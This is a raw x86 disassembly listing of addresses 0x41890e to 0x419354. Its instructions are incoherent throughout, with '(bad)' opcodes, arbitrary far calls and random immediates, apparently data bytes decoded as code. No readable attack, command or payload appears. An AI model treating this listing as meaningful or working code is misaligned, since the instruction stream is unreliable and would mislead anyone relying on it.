  41890e:	jecxz  0x41889f
  418910:	add    al,0x29
  418912:	aas    
  418913:	sub    DWORD PTR [edx-0x52],edi
  418916:	cdq    
  418917:	jmp    0x4188d6
  418919:	repz jmp 0x19c4:0x1eb8d92a
  418921:	mov    ds:0xc77f4991,al
  418926:	ja     0x41895c
  418928:	rcl    DWORD PTR [eax],1
  41892a:	xchg   ecx,eax
  41892b:	mov    eax,ebx
  41892d:	push   edi
  41892e:	jb     0x4188d6
  418930:	or     eax,0x12d84d65
	...
  418995:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41899c:	into   
  41899d:	fwait
  41899e:	cmc    
  41899f:	pop    edx
  4189a0:	sub    ecx,DWORD PTR [esi-0x56f9779b]
  4189a6:	dec    ebx
  4189a7:	add    al,BYTE PTR [ecx]
  4189a9:	add    BYTE PTR [edi],al
  4189ab:	add    DWORD PTR [eax],eax
  4189ad:	add    BYTE PTR ds:0xbd6e1dc4,ch
  4189b3:	(bad)  
  4189b4:	pop    edx
  4189b5:	jg     0x418a09
  4189b7:	call   0x633b4abc
  4189bc:	sub    edi,ecx
  4189be:	pop    es
  4189bf:	mov    edi,0x1b348e9f
  4189c4:	xchg   ebx,eax
  4189c5:	jb     0x4189b6
  4189c7:	sub    esp,DWORD PTR [eax+ebp*8+0x3c393ff0]
  4189ce:	mov    fs,WORD PTR [eiz*2-0x77fec6e4]
  4189d5:	shl    esp,1
  4189d7:	imul   edx,DWORD PTR [ecx],0xcaf65045
  4189dd:	mov    ds:0xd1ca95a1,al
  4189e2:	mov    al,BYTE PTR [esi+0x39458dde]
  4189e8:	mov    ds:0xad18f640,al
  4189ed:	inc    ecx
  4189ee:	jge    0x418a20
  4189f0:	es xor al,dh
  4189f3:	addr16 popa 
  4189f5:	mov    bl,0xbf
  4189f7:	mov    bh,0xa5
  4189f9:	jno    0x4189cd
  4189fb:	fcom   QWORD PTR [eax-0x3605721c]
  418a01:	mov    sp,0xce9c
  418a05:	call   0x3517:0xf2efb23d
  418a0c:	adc    BYTE PTR [ebp+ebp*8+0x22028f42],dh
  418a13:	ins    DWORD PTR es:[edi],dx
  418a14:	cwde   
  418a15:	push   0xd27cf1b1
  418a1a:	pop    edi
  418a1b:	std    
  418a1c:	or     al,0x5e
  418a1e:	or     BYTE PTR ss:[edx-0x74c69015],bh
  418a25:	ins    BYTE PTR es:[edi],dx
  418a26:	jg     0x418a64
  418a28:	loope  0x418a22
  418a2a:	hlt    
  418a2b:	sti    
  418a2c:	sbb    DWORD PTR [eax+0x276ebec2],0x4a
  418a33:	je     0x4189d3
  418a35:	jbe    0x418aa9
  418a37:	push   esp
  418a38:	in     al,0x93
  418a3a:	xor    DWORD PTR [esi+edx*8],0x49
  418a3e:	pop    esp
  418a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a40:	fstp   QWORD PTR [ecx]
  418a42:	jl     0x418a20
  418a44:	test   al,0x67
  418a46:	test   DWORD PTR [edx+0x7af1a50d],edx
  418a4c:	(bad)  
  418a4d:	mov    ah,0x5b
  418a4f:	nop
  418a50:	dec    esi
  418a51:	push   ss
  418a52:	das    
  418a53:	sbb    eax,edi
  418a55:	mov    ds:0xdb199346,al
  418a5a:	inc    edi
  418a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a5c:	inc    edx
  418a5d:	xchg   ebx,eax
  418a5e:	jo     0x418ade
  418a60:	inc    esi
  418a61:	cmp    BYTE PTR [ebx],ah
  418a63:	test   DWORD PTR [edx-0x27c200d7],ebp
  418a69:	loope  0x418a21
  418a6b:	fucomp st(5)
  418a6d:	imul   edi,DWORD PTR [esi-0x6c8d4d10],0xffffff9d
  418a74:	jne    0x418aeb
  418a76:	outs   dx,BYTE PTR ds:[esi]
  418a77:	adc    al,0x1a
  418a79:	push   edi
  418a7a:	scas   eax,DWORD PTR es:[edi]
  418a7b:	push   ebp
  418a7c:	std    
  418a7d:	sbb    bl,BYTE PTR [ecx-0x61ad2e77]
  418a83:	cmp    al,0x5b
  418a85:	ror    BYTE PTR [edx-0x43],1
  418a88:	aam    0x9f
  418a8a:	push   cs
  418a8b:	inc    ebp
  418a8c:	out    dx,eax
  418a8d:	dec    ecx
  418a8e:	add    cl,BYTE PTR [edx]
  418a90:	pushf  
  418a91:	loope  0x418a3d
  418a93:	scas   eax,DWORD PTR es:[edi]
  418a94:	sbb    bh,BYTE PTR [esi]
  418a96:	pop    DWORD PTR [eax]
  418a98:	pop    edx
  418a99:	add    ebp,DWORD PTR [ebx]
  418a9b:	sub    DWORD PTR ds:0x6aec9b8b,eax
  418aa1:	jo     0x418af8
  418aa3:	sbb    DWORD PTR [ecx-0x607a5f79],ebx
  418aa9:	inc    esi
  418aaa:	sbb    DWORD PTR [ebp-0x64],ecx
  418aad:	int    0x4b
  418aaf:	inc    ebp
  418ab0:	ja     0x418aa3
  418ab2:	push   ds
  418ab3:	jmp    0x0:0xdb
	...
  418b16:	jl     0x418b2b
  418b18:	test   DWORD PTR [edx],esi
  418b1a:	out    dx,eax
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0x180941ce
  418b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b24:	repz gs push edx
  418b27:	add    eax,DWORD PTR [ecx]
  418b29:	add    BYTE PTR [edi],al
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    bh,ch
  418b2f:	outs   dx,BYTE PTR ds:[esi]
  418b30:	lea    ebx,[ecx+0x19]
  418b33:	lods   al,BYTE PTR ds:[esi]
  418b34:	push   ecx
  418b35:	pop    ds
  418b36:	jmp    0x418ace
  418b38:	add    eax,0x90616adb
  418b3d:	mov    esi,fs
  418b3f:	add    al,0xac
  418b41:	lods   al,BYTE PTR ds:[esi]
  418b42:	pop    ss
  418b43:	or     ch,BYTE PTR [ebx]
  418b45:	adc    DWORD PTR [ecx+0x58],esi
  418b48:	xor    al,0x2f
  418b4a:	mov    DWORD PTR [edx],ecx
  418b4c:	xor    DWORD PTR [eax+0x21],esi
  418b4f:	daa    
  418b50:	mov    ah,0x93
  418b52:	into   
  418b53:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b55:	dec    ebp
  418b56:	fld    QWORD PTR [edx-0x4e]
  418b59:	mov    eax,0xaffd819b
  418b5e:	adc    al,0x34
  418b60:	sub    BYTE PTR [ecx-0x46],ch
  418b63:	inc    eax
  418b64:	add    al,bh
  418b66:	pop    es
  418b67:	inc    edx
  418b68:	push   es
  418b69:	lahf   
  418b6a:	mov    esi,0xfbc5170c
  418b6f:	es dec esp
  418b71:	xchg   ebp,eax
  418b72:	mov    edx,0x267ea8d2
  418b77:	(bad)  
  418b78:	call   edi
  418b7a:	push   esp
  418b7b:	mov    bl,ah
  418b7d:	xchg   edi,eax
  418b7e:	les    esi,FWORD PTR [edi]
  418b80:	cmp    DWORD PTR [esi],ebp
  418b82:	xor    esi,edx
  418b84:	jle    0x418bdc
  418b86:	pop    esi
  418b87:	aam    0x71
  418b89:	mov    edx,0x11fc5ac9
  418b8e:	xlat   BYTE PTR ds:[ebx]
  418b8f:	and    BYTE PTR ds:0xc58648e7,ch
  418b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b96:	loope  0x418b84
  418b98:	loop   0x418b72
  418b9a:	iret   
  418b9b:	outs   dx,DWORD PTR ds:[esi]
  418b9c:	ds pop ebp
  418b9e:	fcomp  QWORD PTR [ebx+0x3]
  418ba1:	and    DWORD PTR [esi-0x3502a118],edi
  418ba7:	bnd jp 0x418b86
  418baa:	je     0x418b36
  418bac:	adc    esi,ebx
  418bae:	fnstsw WORD PTR [edi]
  418bb0:	adc    edx,edx
  418bb2:	dec    edi
  418bb3:	push   0x33ef24f2
  418bb8:	cmp    al,0xe4
  418bba:	icebp  
  418bbb:	xor    esp,DWORD PTR [edx+0xf685e8c]
  418bc1:	pushf  
  418bc2:	arpl   WORD PTR [eax],ax
  418bc4:	mov    bl,0x9d
  418bc6:	push   0x364ce81d
  418bcb:	xor    esp,DWORD PTR [esi+0x3c469ad8]
  418bd1:	stos   BYTE PTR es:[edi],al
  418bd2:	cwde   
  418bd3:	leave  
  418bd4:	add    DWORD PTR [edx+0x4ba7d4aa],ebp
  418bda:	push   esi
  418bdb:	add    BYTE PTR [eax-0x631dd22d],0x13
  418be2:	xchg   bl,dl
  418be4:	xor    al,0xa
  418be6:	jecxz  0x418bd6
  418be8:	outs   dx,DWORD PTR ds:[esi]
  418be9:	icebp  
  418bea:	sbb    ecx,eax
  418bec:	daa    
  418bed:	in     eax,dx
  418bee:	xor    DWORD PTR [ebx-0x17],0x34
  418bf2:	icebp  
  418bf3:	dec    esp
  418bf4:	dec    ebx
  418bf5:	scas   al,BYTE PTR es:[edi]
  418bf6:	mov    ah,BYTE PTR [esp+edi*8+0x39]
  418bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bfb:	adc    al,0xa7
  418bfd:	dec    eax
  418bfe:	dec    esi
  418bff:	add    esp,DWORD PTR [edx+ebp*8-0x34]
  418c03:	outs   dx,DWORD PTR ds:[esi]
  418c04:	mov    edi,0x5774658c
  418c09:	and    dh,BYTE PTR [ecx+ebx*2-0x67]
  418c0d:	sahf   
  418c0e:	and    BYTE PTR [ebx-0x3cabe0e0],cl
  418c14:	int    0xc5
  418c16:	jns    0x418c4e
  418c18:	xchg   ebx,eax
  418c19:	daa    
  418c1a:	stos   DWORD PTR es:[edi],eax
  418c1b:	cmp    edi,DWORD PTR [ebp-0x218a1448]
  418c21:	into   
  418c22:	or     DWORD PTR [edx+0x24b69b99],ecx
  418c28:	xchg   ecx,eax
  418c29:	dec    edi
  418c2a:	rol    DWORD PTR [eax+0x57aafdc8],1
  418c30:	outs   dx,DWORD PTR ds:[esi]
  418c31:	sub    dh,dl
  418c33:	stos   WORD PTR es:[edi],ax
	...
  418c95:	add    bl,bh
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    ecx,DWORD PTR [edx+0x4f]
  418ca4:	sbb    eax,0x10459bf
  418ca9:	add    BYTE PTR [edi],al
  418cab:	add    DWORD PTR [eax],eax
  418cad:	add    BYTE PTR [ebx],bl
  418caf:	sbb    bl,BYTE PTR [edx+0x7655a4f3]
  418cb5:	or     al,0xa7
  418cb7:	xor    eax,0xd489df29
  418cbc:	shl    ecx,cl
  418cbe:	pop    eax
  418cbf:	mov    edx,0x60113fba
  418cc4:	jecxz  0x418c93
  418cc6:	call   0x7baf:0xc02abe0a
  418ccd:	xchg   ecx,eax
  418cce:	push   eax
  418ccf:	loope  0x418cd8
  418cd1:	inc    ecx
  418cd2:	pusha  
  418cd3:	dec    ebx
  418cd4:	popf   
  418cd5:	dec    esp
  418cd6:	and    BYTE PTR [esi+0x24],dl
  418cd9:	xchg   esp,eax
  418cda:	mov    al,0xb5
  418cdc:	inc    ebx
  418cdd:	das    
  418cde:	ret    
  418cdf:	test   bl,ch
  418ce1:	cmp    BYTE PTR [ebp-0x56],0xdb
  418ce5:	xor    eax,0xf0486d4
  418cea:	cli    
  418ceb:	lods   eax,DWORD PTR ds:[esi]
  418cec:	adc    eax,0x1eeb687f
  418cf1:	mov    bh,0x69
  418cf3:	pushf  
  418cf4:	jle    0x418cbb
  418cf6:	push   es
  418cf7:	sbb    bh,BYTE PTR [edx-0x1d46bd5d]
  418cfd:	lods   al,BYTE PTR ds:[esi]
  418cfe:	and    bl,dl
  418d00:	data16 adc cl,BYTE PTR [ebx+0x5c85cea3]
  418d07:	push   esp
  418d08:	mov    dl,0xcc
  418d0a:	jno    0x418cc0
  418d0c:	dec    ebx
  418d0d:	or     bl,bl
  418d0f:	sub    eax,0xd062a590
  418d14:	add    al,0xf
  418d16:	xor    BYTE PTR [ebp+0x45],bl
  418d19:	xchg   edx,eax
  418d1a:	pop    ss
  418d1b:	mov    edi,0xd960b13
  418d20:	mov    al,0x59
  418d22:	sbb    eax,0xb0cbe4aa
  418d27:	(bad)  
  418d28:	sbb    DWORD PTR [esi],eax
  418d2a:	str    esi
  418d2d:	sbb    al,0xd9
  418d2f:	add    eax,DWORD PTR [ebp-0x58]
  418d32:	xor    cl,bl
  418d34:	push   cs
  418d35:	aad    0x7a
  418d37:	push   ebx
  418d38:	adc    eax,DWORD PTR [edx+0x6a1857c0]
  418d3e:	dec    ecx
  418d3f:	xchg   BYTE PTR [esi],bl
  418d41:	cmp    DWORD PTR [esi],esp
  418d43:	dec    esi
  418d44:	adc    esi,DWORD PTR cs:[edx+0x79]
  418d48:	ins    DWORD PTR es:[edi],dx
  418d49:	sbb    dh,BYTE PTR [esi]
  418d4b:	(bad)  
  418d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d4d:	(bad)  
  418d4e:	mov    esi,0x9c94d070
  418d53:	add    edx,DWORD PTR [ebp+0x5f92f7b8]
  418d59:	pop    eax
  418d5a:	nop
  418d5b:	out    dx,al
  418d5c:	arpl   WORD PTR [edi-0x60],ax
  418d5f:	or     al,0xb1
  418d61:	jl     0x418d66
  418d63:	ret    0x79c2
  418d66:	cmp    eax,DWORD PTR [edx]
  418d68:	mov    esi,0x81b05c8f
  418d6d:	cld    
  418d6e:	scas   eax,DWORD PTR es:[edi]
  418d6f:	sub    eax,0xd8a2ef91
  418d74:	sub    eax,esi
  418d76:	hlt    
  418d77:	fdiv   QWORD PTR [ebx-0x58]
  418d7a:	add    DWORD PTR [edi-0x5d],esi
  418d7d:	jne    0x418d3c
  418d7f:	mov    edx,0xd2679c20
  418d84:	jg     0x418d59
  418d86:	add    ah,BYTE PTR [ebx+edx*8+0x3b]
  418d8a:	js     0x418d6a
  418d8c:	xor    BYTE PTR [eax-0x3eb22821],dl
  418d92:	pop    edi
  418d93:	cmp    DWORD PTR [edi+edx*1+0x79b6e587],esi
  418d9a:	add    ecx,DWORD PTR [ebp-0x56f58f3c]
  418da0:	cli    
  418da1:	dec    esp
  418da2:	ffreep st(0)
  418da4:	add    BYTE PTR ds:0x210d9c35,dh
  418daa:	call   FWORD PTR [ebx+0x1c3ee87f]
  418db0:	idiv   eax
  418db2:	jmp    0x4268fe
	...
  418e13:	add    BYTE PTR [eax],al
  418e15:	add    BYTE PTR [esi],cl
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0x3e098976
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	into   
  418e2f:	lidtd  [ecx+0x5d]
  418e33:	call   0xa9cc:0xcdf600f3
  418e3a:	mov    al,ds:0xd6a2c225
  418e3f:	pop    ebx
  418e40:	mov    ?,WORD PTR [bp-0x96c]
  418e45:	out    dx,al
  418e46:	mov    ds:0x16e99337,eax
  418e4b:	popa   
  418e4c:	push   ds
  418e4d:	nop
  418e4e:	adc    al,0x7a
  418e50:	push   ebx
  418e51:	lahf   
  418e52:	(bad)  
  418e53:	js     0x418e7c
  418e55:	pop    eax
  418e56:	hlt    
  418e57:	sbb    BYTE PTR [ebp-0x1],0xd7
  418e5b:	mov    al,0x94
  418e5d:	outs   dx,BYTE PTR ds:[esi]
  418e5e:	mov    ch,0xf
  418e60:	mov    bh,0x60
  418e62:	sub    esi,edi
  418e64:	cdq    
  418e65:	cli    
  418e66:	imul   edi,DWORD PTR [edi],0x5af12843
  418e6c:	int    0x78
  418e6e:	cdq    
  418e6f:	add    ecx,DWORD PTR [esi-0x6b7bbad7]
  418e75:	les    ebx,FWORD PTR [esi+eiz*4-0xb78822f]
  418e7c:	lods   al,BYTE PTR ds:[si]
  418e7e:	jb     0x418ef9
  418e80:	adc    eax,0x2befe43c
  418e85:	aas    
  418e86:	pop    ss
  418e87:	mov    bl,BYTE PTR [edx]
  418e89:	mov    ecx,eax
  418e8b:	lahf   
  418e8c:	jmp    0x10e366cc
  418e91:	dec    edi
  418e92:	jne    0x418ece
  418e94:	mov    DWORD PTR [esi+ebx*8+0x40],edx
  418e98:	cmp    eax,0x6f0ce23f
  418e9d:	mov    ds:0x90a3bbf4,al
  418ea2:	pop    esi
  418ea3:	(bad)  
  418ea4:	loopne 0x418e94
  418ea6:	adc    eax,0x4360e9da
  418eab:	clc    
  418eac:	pop    ss
  418ead:	cmp    eax,0x86a0fa77
  418eb2:	lds    eax,FWORD PTR [edx-0x28c43cb4]
  418eb8:	sub    edi,ecx
  418eba:	dec    eax
  418ebb:	xchg   BYTE PTR [ebp+0x66721e5],cl
  418ec1:	push   ebp
  418ec2:	gs ins DWORD PTR es:[edi],dx
  418ec4:	adc    ax,WORD PTR [ebp-0x6094a156]
  418ecb:	add    ebx,DWORD PTR [esi+0x3b23ffbf]
  418ed1:	out    dx,eax
  418ed2:	inc    esp
  418ed3:	mov    ds:0xbce5e7b3,eax
  418ed8:	dec    eax
  418ed9:	ins    DWORD PTR es:[edi],dx
  418eda:	cs pop ss
  418edc:	mov    WORD PTR [eax+0x10],cs
  418edf:	mov    edx,0xb76431a2
  418ee4:	and    cl,BYTE PTR [ebp+0x66]
  418ee7:	outs   dx,DWORD PTR ds:[esi]
  418ee8:	inc    ebx
  418ee9:	mul    DWORD PTR [esi-0x71]
  418eec:	add    BYTE PTR [eax-0x64057d33],0x31
  418ef3:	jmp    DWORD PTR [eax-0x7593533]
  418ef9:	in     al,dx
  418efa:	out    0xa3,eax
  418efc:	mov    al,0x68
  418efe:	xchg   edi,eax
  418eff:	fldcw  WORD PTR [eax]
  418f01:	mov    esp,0x11b535d5
  418f06:	jno    0x418e92
  418f08:	mov    ebx,eax
  418f0a:	aad    0x6
  418f0c:	aad    0xb1
  418f0e:	adc    ebx,DWORD PTR [ecx]
  418f10:	fdivr  DWORD PTR ds:0xc3739c82
  418f16:	sub    eax,0x78d8996f
  418f1b:	jae    0x418ee4
  418f1d:	sar    dl,cl
  418f1f:	pop    es
  418f20:	test   DWORD PTR [ecx-0x2e7646b],eax
  418f26:	add    eax,0x4716934
  418f2b:	aam    0xcd
  418f2d:	scas   al,BYTE PTR es:[edi]
  418f2e:	jecxz  0x418eef
  418f30:	gs mul BYTE PTR ds:[edx+0x82]
	...
  418f94:	add    BYTE PTR [eax],al
  418f96:	sbb    al,0x97
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp-0x5885234e]
  418fa3:	push   0xffffffbc
  418fa5:	out    dx,eax
  418fa6:	addr16 push es
  418fa8:	add    DWORD PTR [eax],eax
  418faa:	pop    es
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    BYTE PTR [esi-0x175712d3],cl
  418fb3:	call   0xcca7:0xf79eb44d
  418fba:	mov    dl,0x58
  418fbc:	cli    
  418fbd:	jg     0x418fe0
  418fbf:	outs   dx,DWORD PTR ds:[esi]
  418fc0:	sbb    dl,BYTE PTR [ebp+0x750c50e0]
  418fc6:	jns    0x419008
  418fc8:	or     esi,0x35
  418fcb:	imul   ebp,esi,0xfffffffa
  418fce:	sbb    dh,cl
  418fd0:	push   ebp
  418fd1:	stc    
  418fd2:	add    eax,0x4bf0bad8
  418fd7:	shr    BYTE PTR ds:0x18eb1a15,0x7c
  418fde:	mov    WORD PTR [edi+0x6bec8092],ss
  418fe4:	adc    eax,0x87234c2f
  418fe9:	daa    
  418fea:	push   esi
  418feb:	and    al,BYTE PTR [ecx+0x6e]
  418fee:	iret   
  418fef:	push   ss
  418ff0:	and    eax,DWORD PTR [ecx+edi*1-0x57bde8b0]
  418ff7:	das    
  418ff8:	test   dh,al
  418ffa:	adc    dh,0xb0
  418ffd:	sar    DWORD PTR [ebx-0x4],cl
  419000:	mov    edi,0xecf01f59
  419005:	inc    ecx
  419006:	arpl   sp,si
  419008:	jno    0x419072
  41900a:	ror    DWORD PTR [ebx-0x691ae451],cl
  419010:	or     al,0xeb
  419012:	(bad)  
  419013:	dec    esi
  419014:	call   0xbb31:0x37b17bc0
  41901b:	xchg   ebx,eax
  41901c:	pop    ss
  41901d:	std    
  41901e:	rcl    DWORD PTR [esi-0xfefe8c3],1
  419024:	in     eax,0x33
  419026:	inc    eax
  419027:	add    eax,0x78c81478
  41902c:	repz mov eax,ds:0x1d8287fa
  419032:	xchg   edx,eax
  419033:	jmp    0x41906b
  419035:	inc    esi
  419036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419037:	loope  0x418ff1
  419039:	int    0xea
  41903b:	xchg   esp,eax
  41903c:	inc    ebx
  41903d:	inc    esp
  41903e:	mov    ds:0x990b1d25,eax
  419043:	mov    cl,0xb0
  419045:	pop    eax
  419046:	cwde   
  419047:	jbe    0x418fcc
  419049:	aad    0x2c
  41904b:	push   0x50
  41904d:	add    edx,DWORD PTR [edx-0x612396c]
  419053:	push   0x8e108395
  419058:	retf   
  419059:	inc    edx
  41905a:	fwait
  41905b:	add    BYTE PTR ds:[esi-0x140d3b5e],al
  419062:	mov    ch,0x59
  419064:	mov    BYTE PTR [edi],dh
  419066:	out    dx,eax
  419067:	or     eax,0x87daa000
  41906c:	mov    ah,bl
  41906e:	retf   0xd6f6
  419071:	(bad)  
  419072:	sub    edi,DWORD PTR [edi-0x63]
  419075:	ins    DWORD PTR es:[edi],dx
  419076:	dec    edi
  419077:	(bad)  
  419078:	add    eax,0x65106a7b
  41907d:	das    
  41907e:	fidiv  DWORD PTR [esi+0x8dc00ea]
  419084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419085:	frstor [ebp-0x2066d5b8]
  41908b:	pushf  
  41908c:	sub    DWORD PTR [eax+0x400e3a34],edx
  419092:	cmp    ah,0xf0
  419095:	outs   dx,DWORD PTR ds:[esi]
  419096:	ror    dh,0xc6
  419099:	jp     0x419033
  41909b:	ja     0x419033
  41909d:	jne    0x4190a1
  41909f:	loope  0x419105
  4190a1:	rol    bh,0x79
  4190a4:	xchg   DWORD PTR [ebp+0x2ad61021],edi
  4190aa:	sub    cl,dh
  4190ac:	pop    esp
  4190ad:	scas   eax,DWORD PTR es:[edi]
  4190ae:	sbb    al,0x50
  4190b0:	lea    edi,[ebp+0x13fce9]
	...
  419116:	scas   eax,DWORD PTR es:[edi]
  419117:	test   DWORD PTR [esi-0xa441be],ebx
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    ebx,DWORD PTR [ebx]
  419123:	jb     0x419149
  419125:	jmp    0x429898
  41912a:	pop    es
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    cl,cl
  41912f:	outs   dx,BYTE PTR ds:[esi]
  419130:	outs   dx,BYTE PTR ds:[esi]
  419131:	(bad)  
  419132:	call   0x57ce4854
  419137:	xchg   ebx,eax
  419138:	ins    DWORD PTR es:[edi],dx
  419139:	call   0x221f4975
  41913e:	adc    DWORD PTR [esp+ebx*4+0x42],edx
  419142:	test   DWORD PTR [edi-0x59],esp
  419145:	dec    edi
  419146:	dec    edi
  419147:	aas    
  419148:	mov    ecx,0x2d9d1ccc
  41914d:	xchg   edi,eax
  41914e:	popf   
  41914f:	(bad)  
  419151:	dec    esi
  419152:	mov    al,ds:0xbe572a09
  419157:	mov    bh,0x48
  419159:	lock leave 
  41915b:	cmp    BYTE PTR [ecx+edi*8],bl
  41915e:	dec    edx
  41915f:	jmp    0x4191a2
  419161:	les    esi,FWORD PTR [ebx]
  419163:	push   esp
  419164:	cs mov cl,0x46
  419167:	push   ss
  419168:	inc    ebx
  419169:	das    
  41916a:	mov    bh,0xad
  41916c:	pushf  
  41916d:	add    al,0xd5
  41916f:	push   0x189e408e
  419174:	jle    0x419112
  419176:	fwait
  419177:	(bad)  
  419178:	mov    ch,0x31
  41917a:	sub    ebp,DWORD PTR cs:[ebp+0x1d183fca]
  419181:	addr16 lahf 
  419183:	adc    DWORD PTR [edx-0x21],eax
  419186:	fadd   QWORD PTR [edi+0xd097ede]
  41918c:	test   BYTE PTR [edx+edi*4+0x7],al
  419190:	xor    ebx,DWORD PTR [ebp+ebx*1+0x36]
  419194:	pop    edx
  419195:	popf   
  419196:	scas   al,BYTE PTR es:[edi]
  419197:	outs   dx,BYTE PTR ds:[esi]
  419198:	call   0xa862:0xfd40ac40
  41919f:	int    0xe9
  4191a1:	prefetch BYTE PTR [esi+0x3a]
  4191a5:	lods   al,BYTE PTR ds:[esi]
  4191a6:	sub    eax,0x59c44d8d
  4191ab:	out    dx,al
  4191ac:	fadd   DWORD PTR [esi]
  4191ae:	xor    eax,0xcba77d3e
  4191b3:	mov    dl,0x7b
  4191b5:	pop    edi
  4191b6:	mov    ah,0x8f
  4191b8:	sbb    eax,0xb10619d
  4191bd:	xchg   edi,eax
  4191be:	cmc    
  4191bf:	clc    
  4191c0:	sar    BYTE PTR [esi],cl
  4191c2:	mov    edi,0xa83b1136
  4191c7:	xor    DWORD PTR [edi],ebp
  4191c9:	mov    edx,0xfd37c580
  4191ce:	outs   dx,DWORD PTR ds:[esi]
  4191cf:	fisttp QWORD PTR [ebp-0x2280c178]
  4191d5:	ficom  WORD PTR [edx+0x79]
  4191d8:	jle    0x4191c9
  4191da:	call   0x1d6b:0xdb60b168
  4191e1:	pop    ds
  4191e2:	test   eax,0x6f0bbbdc
  4191e7:	inc    edi
  4191e8:	mov    esi,0xb89d57c2
  4191ed:	add    al,0x69
  4191ef:	daa    
  4191f0:	retf   0xa9df
  4191f3:	test   DWORD PTR ds:0x491d950e,eax
  4191f9:	mov    esi,0x2d1d0edd
  4191fe:	xchg   edx,eax
  4191ff:	test   al,0xa9
  419201:	inc    eax
  419202:	jae    0x419278
  419204:	mov    edi,0x497b733
  41920a:	sbb    eax,DWORD PTR [edx+ebx*1]
  41920d:	inc    edi
  41920e:	push   esp
  41920f:	pop    edx
  419210:	or     esi,DWORD PTR [edi]
  419212:	xor    eax,ebp
  419214:	or     DWORD PTR [edi],ebx
  419216:	xchg   ebx,eax
  419217:	in     eax,0x10
  419219:	xchg   esp,eax
  41921a:	enter  0xc497,0x60
  41921e:	jbe    0x41926d
  419220:	out    dx,eax
  419221:	push   DWORD PTR [ecx-0x57]
  419224:	sbb    DWORD PTR [ebp+0x9c86d17],0x2a
  41922b:	(bad)  
  41922c:	jmp    0x4a9cc659
  419231:	xor    bh,ah
  419233:	in     al,dx
  419234:	test   BYTE PTR [eax],0x0
	...
  419293:	add    BYTE PTR [eax],al
  419295:	add    BYTE PTR [eax-0xcc4519],ah
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0xb422bb4f
  4192a5:	das    
  4192a6:	jne    0x4192b0
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [edx+0x52],dl
  4192b0:	scas   eax,DWORD PTR es:[edi]
  4192b1:	enter  0x3946,0xa0
  4192b5:	scas   al,BYTE PTR es:[edi]
  4192b6:	mov    WORD PTR [edi+0x6a],es
  4192b9:	int3   
  4192ba:	and    edi,DWORD PTR [edi]
  4192bc:	push   edi
  4192bd:	fidiv  DWORD PTR [eax+ebp*1]
  4192c0:	out    0xf6,al
  4192c2:	pushf  
  4192c3:	fdecstp 
  4192c5:	pop    esi
  4192c6:	fs iret 
  4192c8:	inc    esi
  4192c9:	ins    BYTE PTR es:[edi],dx
  4192ca:	cmp    esp,DWORD PTR [ecx]
  4192cc:	pop    eax
  4192cd:	sub    DWORD PTR [eax-0x53],ebp
  4192d0:	fiadd  DWORD PTR [eax-0x7e]
  4192d3:	pop    eax
  4192d4:	xchg   ebx,eax
  4192d5:	scas   al,BYTE PTR es:[edi]
  4192d6:	ds mov ah,0x20
  4192d9:	arpl   WORD PTR [eax-0x3d439d49],sp
  4192df:	mov    ah,BYTE PTR [edx+0x23]
  4192e2:	add    al,0x38
  4192e4:	xor    DWORD PTR [ecx],esp
  4192e6:	cmp    eax,0x795266c3
  4192eb:	xchg   DWORD PTR [eax+esi*8-0x7d487897],esi
  4192f2:	clc    
  4192f3:	pop    ds
  4192f4:	inc    eax
  4192f5:	retf   
  4192f6:	mov    ah,0xa2
  4192f8:	mov    WORD PTR [esi-0xb],?
  4192fb:	jb     0x419355
  4192fd:	in     eax,dx
  4192fe:	xchg   edx,eax
  4192ff:	(bad)  
  419300:	into   
  419301:	sub    al,0x97
  419303:	sar    DWORD PTR [eax-0x3e],0xf7
  419307:	xchg   esp,eax
  419308:	cmp    BYTE PTR [ebp+0x5f],bh
  41930b:	mov    al,ds:0x9bc49968
  419310:	push   edx
  419311:	dec    ecx
  419313:	pop    ecx
  419314:	fcom   QWORD PTR [edi]
  419316:	cmp    ebp,esi
  419318:	sbb    eax,0xce84a503
  41931d:	mov    ds:0x82edd5b,al
  419322:	pusha  
  419323:	mov    bh,0xbf
  419325:	cmp    eax,0x146f01
  41932a:	xchg   edi,eax
  41932b:	imul   esp,DWORD PTR [ebx-0x759c029a],0x5da6ca12
  419335:	stos   DWORD PTR es:[edi],eax
  419336:	inc    esp
  419337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419338:	fs cmp al,0x5
  41933b:	sbb    cl,BYTE PTR [esi-0x3b7537bb]
  419341:	mov    WORD PTR [edi+eiz*4],ss
  419344:	dec    ebp
  419345:	mov    ecx,eax
  419347:	add    eax,0xdf2e20bc
  41934c:	inc    ecx
  41934d:	sub    dh,BYTE PTR [edi]
  41934f:	mov    ebp,0x8163ac4e
  419354:	stos   DWORD PTR es:[edi],eax
